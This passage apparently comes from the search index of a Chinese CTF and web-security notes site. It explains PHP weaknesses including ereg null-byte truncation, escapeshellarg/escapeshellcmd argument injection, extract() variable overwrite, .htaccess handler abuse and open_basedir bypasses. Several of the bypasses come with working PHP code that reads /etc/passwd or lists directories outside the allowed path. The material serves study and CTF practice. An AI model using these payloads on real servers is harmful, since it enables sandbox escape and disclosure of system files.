<p>php7\u4e2d\uff0cassert\u4e0d\u518d\u662f\u51fd\u6570\uff0c\u53d8\u6210\u4e86\u4e00\u4e2a\u8bed\u8a00\u7ed3\u6784(\u7c7b\u4f3ceval)\uff0c\u4e0d\u80fd\u518d\u4f5c\u4e3a\u51fd\u6570\u540d\u52a8\u6001\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/ereg%E6%AD%A3%E5%88%99%2500%E6%88%AA%E6%96%AD/","title":"ereg\u6b63\u5219%00\u622a\u65ad","text":"<pre><code>&lt;?php\n$flag = \"flag\";\nif (isset ($_GET['nctf'])) {\nif (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE)\necho '\u5fc5\u987b\u8f93\u5165\u6570\u5b57\u624d\u884c';\nelse if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)\ndie('Flag: '.$flag);\nelse\necho '\u9a9a\u5e74\uff0c\u7ee7\u7eed\u52aa\u529b\u5427\u554a~';\n}\n?&gt;\n</code></pre> <p>ereg\u51fd\u6570\u9047\u5230%00\u4f1a\u8ba4\u4e3a\u51fd\u6570\u6267\u884c\u5b8c\u6bd5</p> <p>http://127.0.0.1/Php_Bug/16.php?nctf=1%00%23biubiubiu</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/escapeshellarg%28%29_escapeshellcmd%28%29/","title":"escapeshellarg()+escapeshellcmd()","text":"<p>escapeshellarg\u4f1a\u5bf9\u6240\u6709\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49,\u5e76\u4e14\u7ed9\u5b57\u7b26\u4e32\u589e\u52a0\u4e00\u4e2a \u5355\u5f15\u53f7</p> <p>escapeshellcmd\u4ec5\u4f1a\u5bf9\u843d\u5355\u4e86\u7684\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49\uff0c\u5bf9\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\u5982\uff1a&amp; # ;` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $</p> <p>\u4f20\u5165\u7684\u53c2\u6570\u662f\uff1a172.17.0.2'-v -d a=1</p> <p>\u7ecf\u8fc7escapeshellarg\u5904\u7406\u540e\u53d8\u6210\u4e86'172.17.0.2'\\'' -v -d a=1'\uff0c\u5373\u5148\u5bf9\u5355\u5f15\u53f7\u8f6c\u4e49\uff0c\u518d\u7528\u5355\u5f15\u53f7\u5c06\u5de6\u53f3\u4e24\u90e8\u5206\u62ec\u8d77\u6765\u4ece\u800c\u8d77\u5230\u8fde\u63a5\u7684\u4f5c\u7528\u3002</p> <p>\u7ecf\u8fc7escapeshellcmd\u5904\u7406\u540e\u53d8\u6210'172.17.0.2'\\'' -v -d a=1\\'\uff0c\u8fd9\u662f\u56e0\u4e3aescapeshellcmd\u5bf9\\\u4ee5\u53ca\u6700\u540e\u90a3\u4e2a\u4e0d\u914d\u5bf9\u513f\u7684\u5f15\u53f7\u8fdb\u884c\u4e86\u8f6c\u4e49\uff1ahttp://php.net/manual/zh/function.escapeshellcmd.php</p> <p>\u6700\u540e\u6267\u884c\u7684\u547d\u4ee4\u662fcurl'172.17.0.2'\\'' -v -d a=1\\'\uff0c\u7531\u4e8e\u4e2d\u95f4\u7684\\\u88ab\u89e3\u91ca\u4e3a\\\u800c\u4e0d\u518d\u662f\u8f6c\u4e49\u5b57\u7b26\uff0c\u6240\u4ee5\u540e\u9762\u7684'\u6ca1\u6709\u88ab\u8f6c\u4e49\uff0c\u4e0e\u518d\u540e\u9762\u7684'\u914d\u5bf9\u513f\u6210\u4e86\u4e00\u4e2a\u7a7a\u767d\u8fde\u63a5\u7b26\u3002\u6240\u4ee5\u53ef\u4ee5\u7b80\u5316\u4e3acurl 172.17.0.2 -v -da=1'\uff0c\u5373\u5411172.17.0.2\\\u53d1\u8d77\u8bf7\u6c42\uff0cPOST \u6570\u636e\u4e3aa=1'\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/","title":"extract\u53d8\u91cf\u8986\u76d6","text":"<p>\u5b8c\u5168\u53ef\u4ee5\u81ea\u5df1\u642d\u4e2a\u73af\u5883\u6765\u73a9\uff0c\u52a0\u6761highligh_file(\"index.php\")</p> <pre><code>&lt;?php\n$flag='xxx';\nextract($_GET);\nif(isset($shiyan))\n{\n$content=trim(file_get_contents($flag));\nif($shiyan==$content)\n{\necho'ctf{xxx}';\n}\nelse\n{\necho'Oh.no';\n}\n}\n?&gt;\n</code></pre> <p>\u5b9a\u4e49\u548c\u7528\u6cd5</p> <p>extract() \u51fd\u6570\u4ece\u6570\u7ec4\u4e2d\u5c06\u53d8\u91cf\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\u3002</p> <p>\u8be5\u51fd\u6570\u4f7f\u7528\u6570\u7ec4\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4f7f\u7528\u6570\u7ec4\u952e\u503c\u4f5c\u4e3a\u53d8\u91cf\u503c\u3002\u9488\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u5c06\u5728\u5f53\u524d\u7b26\u53f7\u8868\u4e2d\u521b\u5efa\u5bf9\u5e94\u7684\u4e00\u4e2a\u53d8\u91cf\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570type\u7528\u4e8e\u6307\u5b9a\u5f53\u67d0\u4e2a\u53d8\u91cf\u5df2\u7ecf\u5b58\u5728\uff0c\u800c\u6570\u7ec4\u4e2d\u53c8\u6709\u540c\u540d\u5143\u7d20\u65f6\uff0cextract() \u51fd\u6570\u5982\u4f55\u5bf9\u5f85\u8fd9\u6837\u7684\u51b2\u7a81\u3002</p> <p>\u8be5\u51fd\u6570\u8fd4\u56de\u6210\u529f\u5bfc\u5165\u5230\u7b26\u53f7\u8868\u4e2d\u7684\u53d8\u91cf\u6570\u76ee\u3002</p> <p>http://127.0.0.1/Php_Bug/extract1.php?shiyan=&amp;flag=1</p> <p>\u7565\u5fae\u89e3\u91ca</p> <p>\u9996\u5148\u662fisset,\u53ea\u68c0\u67e5\u53d8\u91cf\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u4f1a\u53bb\u68c0\u67e5\u53d8\u91cf\u7684\u503c\u4e3a\u7a7a\u6216\u8005\u4ec0\u4e48\u5176\u4ed6\u7684\u4e1c\u897f</p> <p>\u7136\u540efile_get_contents\u5f53\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u65f6\u5019\u7684\u8fd4\u56de\u662f\u4e2a0,\u7136\u540e\u7a7a=0</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/get_header%28%29/","title":"get_header()","text":""},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/get_header%28%29/#get_header00","title":"get_header()\u51fd\u6570\u4f1a\u622a\u65ad\u7a7a\u5b57\u7b26\u540e\u7684\u5185\u5bb9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e3a%00","text":""},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/htaccess%E6%96%87%E4%BB%B6/","title":".htaccess\u6587\u4ef6","text":"<p>\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6</p> <p>\u5168\u79f0\u662fHypertext Access(\u8d85\u6587\u672c\u5165\u53e3)\u3002\u63d0\u4f9b\u4e86\u9488\u5bf9\u76ee\u5f55\u6539\u53d8\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c \u5373\uff0c\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u6587\u6863\u76ee\u5f55\u4e2d\u653e\u7f6e\u4e00\u4e2a\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u4ee4\u7684\u6587\u4ef6\uff0c \u4ee5\u4f5c\u7528\u4e8e\u6b64\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\u3002\u4f5c\u4e3a\u7528\u6237\uff0c\u6240\u80fd\u4f7f\u7528\u7684\u547d\u4ee4\u53d7\u5230\u9650\u5236\u3002\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7Apache\u7684AllowOverride\u6307\u4ee4\u6765\u8bbe\u7f6e\u3002.htaccess\u662f\u4e00\u4e2a\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u5b58\u653e\u7740\u4e00\u4e9bapache\u6307\u4ee4\uff0c\u4e0ehttpd.conf\u7c7b\u4f3c\uff0c\u4f46\u4f5c\u7528\u8303\u56f4\u4ec5\u9650\u5f53\u524d\u76ee\u5f55\u3002</p> <p>.htaccess\u662f\u5728\u7528\u6237\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u7ad9\u70b9\u65f6\u52a0\u8f7d\u7684\uff0c\u4e0d\u9700\u8981\u91cd\u542fapache\u670d\u52a1\u8fdb\u884c\u8f7d\u5165\uff0c\u66f4\u7075\u6d3b\u4f46\u66f4\u8017\u7cfb\u7edf\u8d44\u6e90\u3002\u7531\u4e8e.htaccess\u53ef\u4ee5\u914d\u7f6e\u5f88\u591a\u4e1c\u897f\uff0c\u5982\u76ee\u5f55\u8bbf\u95ee\u3001\u6587\u4ef6\u6267\u884c\u3001\u9519\u8bef\u9875\u9762\u91cd\u5b9a\u5411\u7b49</p> <p>\u7a0d\u5fae\u4e3e\u4e2a\u4f8b\u5b57\uff1a</p> <p> <p>SetHandlerapplication/x-httpd-php</p> <p>//\u6216\u8005\u5e72\u8106\u4e0d\u8981FilesMatch,\u8fd9\u91cc\u7684\u610f\u601d\u662f\u914d\u7f6e\uff0c\u5982\u679c\u5305\u542b1\uff0c\u5219\u5c06\u5176\u89c6\u4e3aphp\u6587\u4ef6\u6267\u884c</p> <p>\u901a\u5e38\u5728\u6587\u4ef6\u4e0a\u4f20\u4e2d\u4f7f\u7528\u3002\u4e0a\u4f20\u4e00\u4e2a.htaccess\u6587\u4ef6\u4e4b\u540e\u5c31\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2a\u5305\u542b1\u7684\u6587\u4ef6\u4e0a\u53bb\uff0c\u4e71\u6740\u6267\u884c\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/","title":"Open basedir\u7ed5\u8fc7","text":"<p>open_basedir\u7ed5\u8fc7</p> <p>open_basedir\u662fphp.ini\u4e2d\u7684\u4e00\u4e2a\u914d\u7f6e\u9009\u9879\uff0c\u5b83\u53ef\u5c06\u7528\u6237\u8bbf\u95ee\u6587\u4ef6\u7684\u6d3b\u52a8\u8303\u56f4\u9650\u5236\u5728\u6307\u5b9a\u7684\u533a\u57df</p> <p>\u5047\u8bbeopen_basedir=/home/wwwroot/home/web1/:/tmp/\uff0c\u90a3\u4e48\u901a\u8fc7web1\u8bbf\u95ee\u670d\u52a1\u5668\u7684</p> <p>\u7528\u6237\u5c31\u65e0\u6cd5\u83b7\u53d6\u670d\u52a1\u5668\u4e0a\u9664\u4e86/home/wwwroot/home/web1/\u548c/tmp/\u8fd9\u4e24\u4e2a\u76ee\u5f55\u4ee5\u5916\u7684\u6587\u4ef6\u3002</p> <p>\u6ce8\u610f\u7528open_basedir\u6307\u5b9a\u7684\u9650\u5236\u5b9e\u9645\u4e0a\u662f\u524d\u7f00,\u800c\u4e0d\u662f\u76ee\u5f55\u540d\u3002\u4e3e\u4f8b\u6765\u8bf4: \u82e5\"open_basedir = /dir/user\", \u90a3\u4e48\u76ee\u5f55 \"/dir/user\" \u548c \"/dir/user1\"\u90fd\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u3002\u4ee5\u4e0b\u4e3a\u642c\u8fd0</p> <p>\u6211\u4eec\u5728wwwroot\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2ahtml\u6587\u4ef6\u5939\u548c\u4e00\u4e2a\u6587\u672c\u6587\u4ef61.txt</p> <p>\u5176\u4e2d1.txt\u5185\u5bb9\u4e3a123456</p> <p>html\u4e3a\u7f51\u7ad9\u6839\u76ee\u5f55\uff0c\u4e0b\u6709\u4e00\u4e2aindex.php\u548ctest.php</p> <p>\u5176\u4e2dtest.php\u5c31\u662f\u6211\u4eec\u7528\u6765\u6d4b\u8bd5\u7684php\u6587\u4ef6\uff0c\u5982\u4e0b</p> <pre><code>&lt;?php\nhighlight_file(\"../1.txt\");\n$file=file_get_contents('../1.txt');\necho $file;\n?&gt;\n</code></pre> <p>\u5728\u672a\u8bbe\u7f6eopen_basedir\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u7ed3\u679c</p> <p></p> <p>\u6211\u4eec\u8bbe\u7f6eopen_basedir</p> <p></p> <p>\u5373\u53ea\u80fd\u8bbf\u95eehtml\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6</p> <p></p> <p>\u53ef\u89c1\uff0c\u65e0\u8bba\u662ffile_get_contents\u51fd\u6570\u8fd8\u662fhighlight_file\u90fd\u65e0\u6548</p> <p>\u7531\u4e8eopen_basedir\u7684\u8bbe\u7f6e\u5bf9system\u7b49\u547d\u4ee4\u6267\u884c\u51fd\u6570\u662f\u65e0\u6548\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\u6765\u8bbf\u95ee\u9650\u5236\u76ee\u5f55\u3002</p> <p>\u6211\u4eec\u5c06test.php\u4fee\u6539\u540e</p> <p></p> <p>\u53ef\u89c1\u53ef\u4ee5\u65e0\u89c6open_basedir\uff0c\u4f46\u662f\u4e00\u822c\u90fd\u4f1a\u7981\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff0c\u6240\u4ee5\u5b9e\u7528\u4ef7\u503c\u4e0d\u5927</p> <p>\uff08\u786e\u5b9e\uff0c\u6709system\u4e86\u8c01\u8fd8\u7ed5\u4f60\u4e2a\u5927\u5934\u9b3c\u554a\uff09</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#symlink","title":"\u8f6f\u94fe\u63a5\uff1asymlink()\u51fd\u6570","text":"<p>\u6ce8\u610f\uff1a \u9488\u5bf9 Windows\uff1a\u8fd0\u884c PHP \u4e8eVista\u3001Server 2008 \u6216\u66f4\u9ad8\u7248\u672c\u624d\u80fd\u6b63\u5e38\u4f7f\u7528\u3002 \u4e4b\u524d\u7248\u672c\u7684 Windows \u4e0d\u652f\u6301\u7b26\u53f7\u8fde\u63a5</p> <p>\u6b64\u6b21\u5b9e\u9a8c\u73af\u5883\uff1alinux Ubuntu18.04.4 php 7.1.31</p> <p>\u6211\u4eec\u9996\u5148\u5c1d\u8bd5\u4f7f\u7528symlink\u521b\u5efa\u4e00\u4e2a\u8f6f\u94fe\u63a5</p> <p></p> <p>\u76ee\u6807\u6307\u5411html\u76ee\u5f55\u4e0b\u7684error\u6587\u4ef6\u5939\uff0c\u8bbf\u95ee\u540e\u53d1\u73b0\u751f\u6210\u4e00\u4e2a\u94fe\u63a5</p> <p></p> <p>\u53cc\u51fb\u8fdb\u53bb\u53ef\u4ee5\u8bbf\u95ee\u5230\u5982\u4e0b</p> <p></p> <p>\u6211\u4eec\u4fdd\u6301\u4e4b\u524d\u7684\u8bbe\u7f6e\u4e0d\u53d8\uff0c\u5c1d\u8bd5\u5728open_basedir\u8bbe\u7f6e\u5230html\u76ee\u5f55\u4e0b\uff0c\u8bfb\u53d6\u548chtml\u6587\u4ef6\u5939\u5e73\u884c\u76841.txt</p> <p>\u6211\u4eec\u7ed9\u51fa\u6f0f\u6d1ephp\u5185\u5bb9</p> <pre><code>&lt;?php\nmkdir(\"c\");\nchdir(\"c\");\nmkdir(\"d\");\nchdir(\"d\");\nchdir(\"..\");\nchdir(\"..\");\nsymlink(\"c/d\",\"tmplink\");\nsymlink(\"tmplink/../../1.txt\",\"exploit\");\nunlink(\"tmplink\");\nmkdir(\"tmplink\");\necho file_get_contents(\"http://localhost/exploit\");\n?&gt;\n</code></pre> <p>\u8fd0\u884c\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u53ef\u89c1\u5728html\u4e0b\u751f\u6210c/d/\u548ctmplink\u4ee5\u53caexploit\uff0c\u800c\u6211\u4eec\u6210\u529f\u8bfb\u53d6\u5230\u4e861.txt\u7684\u5185\u5bb9</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u4e00\u4e0b\u94fe\u63a5</p> <p></p> <p>exploit\u94fe\u63a5\u5230\u7684\u662ftmplink/../../1.txt\uff0c\u800ctmplink\u94fe\u63a5\u5230c/d\uff0c\u76f8\u5f53\u4e8eexploit\u94fe\u63a5\u5230c/d/../../1.txt\uff0c\u8def\u5f84\u5728open_basedir\u89c4\u5b9a\u7684\u76ee\u5f55\u4e0b\uff0c\u7b26\u5408\u64cd\u4f5c\u89c4\u8303\uff0c\u4e4b\u540e\u5220\u9664\u4e86tmplink\u94fe\u63a5\uff0c\u521b\u5efa\u4e86tmplink\u5b9e\u4f53\u6587\u4ef6\u5939\uff0c\u76f8\u5f53\u4e8e\u6b64\u65f6\u7684exploit\u6307\u5411\u7684\u5c31\u662ftmplink/../../1.txt,\u4e5f\u5c31\u6210\u529f\u8bfb\u53d6\u5230\u4e861.txt</p> <p>\u5173\u4e8e\u8f6f\u94fe\u4e5f\u53ef\u4ee5\u6709\u53e6\u4e00\u79cd\u505a\u6cd5\uff0c\u6d4b\u8bd5php\u5982\u4e0b</p> <pre><code>mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);\nsymlink('/var/www/html/a/b/c/d/e/f/g','foo');\nini_set('open_basedir','/var/www/html:bar/');\nsymlink('foo/../../../../../../','bar');\nunlink('foo');\nsymlink('/var/www/html','foo');\necho file_get_contents('bar/etc/passwd');\n</code></pre> <p>\u539f\u7406\u662f\u4e00\u6837\u7684\uff0c\u53ea\u4e0d\u8fc7\u628a\u8f6f\u94fe\u6539\u4e3a\u5b9e\u4f53\u6587\u4ef6\u5939\u7684\u6b65\u9aa4\u6362\u6210\u4e86\u91cd\u6784\u8f6f\u94fe\u76ee\u6807</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#glob","title":"glob\u4f2a\u534f\u8bae","text":"<p>glob\u4f2a\u534f\u8bae\u5728\u7b5b\u9009\u76ee\u5f55\u65f6\u4e0d\u53d7open_basedir\u5236\u7ea6</p> <pre><code>&lt;?php\nprintf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));\n$file_list = array();\n// normal files\n$it = new DirectoryIterator(\"glob:///*\");\nforeach($it as $f) {\n$file_list[] = $f-&gt;__toString();\n}\n// special files (starting with a dot(.))\n$it = new DirectoryIterator(\"glob:///.*\");\nforeach($it as $f) {\n$file_list[] = $f-&gt;__toString();\n}\nsort($file_list);\nforeach($file_list as $f){\necho \"{$f}&lt;br/&gt;\";\n}\n?&gt;\n</code></pre> <p>\u4e0a\u8ff0payload\u53ef\u5728php5.3\u4ee5\u4e0a\u8bfb\u53d6\u4ec5\u9488\u5bf9linux\u6839\u76ee\u5f55\u7684\u76ee\u5f55</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#ini_set","title":"\u5229\u7528ini_set\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9","text":"<p>\u6211\u4eec\u7ed9\u51fa\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff0c\u7531\u4e8e\u6f0f\u6d1e\u539f\u7406\u590d\u6742\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u81ea\u5df1\u7814\u7a76\uff0c\u8fd9\u91cc\u5c31\u4e0d\u53d9\u8ff0</p> <pre><code>&lt;?php\nmkdir('tmpdir');\nchdir('tmpdir');\nini_set('open_basedir','..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nchdir('..');\nini_set('open_basedir','/');\n$a=file_get_contents('/etc/passwd');\nvar_dump($a);\n?&gt;\n</code></pre> <p>\u6ce8\u610f\uff1a\u8fd9\u91cc\u7684chdir(\"..\");\u6570\u91cf\u636e\u5177\u4f53\u73af\u5883\u4fee\u6539\uff0c\u4e00\u822c\u8981\u6c42\u662f\u5982\u679c\u518dchdir\u4e00\u6b21\u5c31\u8fdb\u5165\u6839\u76ee\u5f55\u4e3a\u6b62\uff0c\u6bd4\u5982php\u6587\u4ef6\u7684\u4f4d\u7f6e\u4e3a/www/admin/localhost_80/wwwroot/html/\u4e0b,\u90a3\u4e48\u5c31\u8981\u4f7f\u7528\u4e94\u6b21chdir(\"..\");</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_1","title":"\u516d.\u5176\u4ed6\u8bfb\u76ee\u5f55\u65b9\u5f0f","text":"<p>\u5bf9\u4e8ewindows\u7cfb\u7edf</p> <pre><code>&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\nset_error_handler('isexists');\n$dir = 'd:/test/';\n$file = '';\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$file = $dir . $chars[$i] . '&lt;&gt;&lt;';\nrealpath($file);\n}\nfunction isexists($errno, $errstr)\n{\n$regexp = '/File\\((.*)\\) is not within/';\npreg_match($regexp, $errstr, $matches);\nif (isset($matches[1])) {\nprintf(\"%s &lt;br/&gt;\", $matches[1]);\n}\n}\n?&gt;\n&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\n$basedir = 'D:/test/';\n$arr = array();\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$info = new SplFileInfo($basedir . $chars[$i] . '&lt;&gt;&lt;');\n$re = $info-&gt;getRealPath();\nif ($re) {\ndump($re);\n}\n}\nfunction dump($s){\necho $s . '&lt;br/&gt;';\nob_flush();\nflush();\n}\n&lt;?php\nini_set('open_basedir', dirname(__FILE__));\nprintf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));\nset_error_handler('isexists');\n$dir = 'd:/test/';\n$file = '';\n$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\nfor ($i=0; $i &lt; strlen($chars); $i++) {\n$file = $dir . $chars[$i] . '&lt;&gt;&lt;';\n//$m = imagecreatefrompng(\"zip.png\");\n//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');\nimageftbbox(100, 100, $file, 'aaa');\n}\nfunction isexists($errno, $errstr)\n{\nglobal $file;\nif (stripos($errstr, 'Invalid font filename') === FALSE) {\nprintf(\"%s&lt;br/&gt;\", $file);\n}\n}\n?&gt;\n</code></pre> <p>\u4ee5\u4e0a\u90fd\u662fwindows\u4e0b\u7684\u5217\u76ee\u5f55\u65b9\u5f0f\uff0c\u7528\u5230\u4e86windows\u4e0b\u901a\u914d\u7b26&lt;&gt;</p> <pre><code>&lt;?php\nprintf('&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));\n$re = bindtextdomain('xxx', $_GET['dir']);\nvar_dump($re);\n?&gt;\n</code></pre> <p>\u8fd9\u4e2a\u662flinux\u4e0b\u7684\u65b9\u6cd5\uff0cdir\u4f20\u5165\u7684\u53c2\u6570\u662f\u76ee\u5f55\uff0c\u5982\u679c\u76ee\u5f55\u5b58\u5728\uff0c\u5c31\u8fd4\u56de\u76ee\u5f55\u8def\u5f84\uff0c\u4e0d\u5b58\u5728\u5c31\u8fd4\u56debool(false)\uff0c\u7528\u4e8e\u66b4\u529b\u731c\u89e3\u76ee\u5f55</p> <p>\u5173\u4e8eini_set\u7684\u539f\u7406\uff0c\u6211\u4e5f\u627e\u5230\u4e86\u4e00\u70b9\u5185\u5bb9\u76f4\u63a5copy\u4e0b\u6765\u3002</p> <p>\u5148\u770bpayload</p> <pre><code>chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));\n</code></pre>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#_2","title":"\u6e90\u7801\u5206\u6790","text":""},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#ini_set_1","title":"ini_set","text":"<p>\u5f88\u597d\u641c</p> <p></p> <p>\u5bf9\u7740php.net\u7684\u89e3\u91ca\u770b\u4e00\u4e0b \u731c\u4e5f\u80fd\u731c\u4e2a\u5927\u6982</p> <p>\u5148\u8df3\u8fc7<code>php_check_open_basedir</code>\u770b<code>zend_alter_ini_entry_ex</code></p> <p></p> <p>\u5148\u4eceEG\u8868\u4e2d\u53d6\u51fa\u8981\u4fee\u6539\u7684\u9879\u76ee\u7684\u6307\u9488\uff0c\u7136\u540e\u4e00\u8def\u8d4b\u503c\u8fc7\u53bb<code>new_value =&gt; duplicate =&gt; ini_entry-&gt;value</code></p> <p>\u76f4\u63a5\u770b\u4e0bgdb\u7684\u8c03\u8bd5\u7ed3\u679c \u6700\u521d\u7684\u65f6\u5019\u503c\u662fini\u91cc\u9762\u7684\u503c</p> <p></p> <p>\u6267\u884c\u4e0b\u53bb \u53ef\u4ee5\u770b\u5230\u503c\u6539\u53d8\u4e86</p> <p></p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#chdir","title":"chdir","text":"<p>\u5148\u7ecf\u8fc7open_basedir\u7684\u68c0\u6d4b \u7136\u540e\u6765\u5230336\u884c<code>VCWD_CHDIR</code>\u8fd9\u4e2a\u5b8f\u6700\u7ec8\u4f1a\u8c03\u7528<code>_chdir()</code>\u6765\u4fee\u6539\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/open_basedir%E7%BB%95%E8%BF%87/#open_basedir","title":"open_basedir\u5b9e\u73b0","text":"<p>\u8fd9\u4e2a\u4e5f\u7b80\u5355 \u5148\u770b\u4e0b\u62a5\u9519\u641c\u6e90\u4ee3\u7801</p> <p></p> <p></p> <p>\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u4e0a\u9762\u5ffd\u7565\u7684<code>php_check_open_basedir</code>\u7684\u5177\u4f53\u5b9e\u73b0 \u51fd\u6570\u5f88\u7b80\u5355\u6ca1\u5565\u597d\u8bf4\u7684 \u76f4\u63a5\u8ddf<code>php_check_specific_open_basedir</code>(\u867d\u7136\u8fd9\u91cc<code>ptr</code>\u7684\u503c\u6765\u81ea<code>PG(open_basedir)</code>\u4f46\u662f\u5728<code>ini_set</code>\u4e2d\u4f5c\u51fa\u7684\u5bf9<code>EG</code>\u7684\u4fee\u6539\u6700\u7ec8\u4f1a\u5f71\u54cd<code>PG</code>)</p> <p>\u51fd\u6570\u6709\u70b9\u957f\u4e0d\u60f3\u770b \u76f4\u63a5gdb\u8c03\u4e00\u53d1 \u5bf9\u7740<code>php_check_specific_open_basedir</code>\u6253\u4e2a\u65ad\u70b9 \u7136\u540e\u76f4\u63a5c\u5230\u7b2c\u4e00\u4e2a<code>chdir('..')</code></p> <p></p> <p>\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u4f20\u8fdb\u53bb\u7684\u4e24\u4e2a\u53c2\u6570 \u7ee7\u7eed\u6267\u884c\u6765\u5230161\u884c \u5148\u8bb0\u5f55\u4e00\u4e0b\u5173\u952e\u53c2\u6570</p> <p></p> <p>\u6267\u884c\u4e0b\u53bb 